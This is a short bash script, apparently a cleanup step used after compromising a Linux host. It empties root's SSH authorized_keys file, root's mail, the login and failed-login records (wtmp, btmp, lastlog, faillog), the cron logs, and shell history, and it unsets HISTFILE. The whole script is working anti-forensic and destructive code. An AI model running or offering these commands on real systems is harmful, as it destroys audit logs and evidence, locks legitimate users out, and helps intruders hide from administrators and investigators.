#!/bin/bash

# Remove SSH authorized_keys for root (disables key-based login)
> /root/.ssh/authorized_keys

# Wipe root user's mail
> /var/spool/mail/root

# Wipe login history
> /var/log/wtmp
> /var/log/btmp
> /var/log/lastlog
> /var/log/faillog

# Wipe cron logs (name may vary by system)
[ -f /var/log/cron ] && > /var/log/cron
[ -f /var/log/cron.log ] && > /var/log/cron.log

# Clear shell history
> /root/.bash_history
unset HISTFILE

# Also attempt to clear history of current user if script is run non-root
> ~/.bash_history
unset HISTFILE
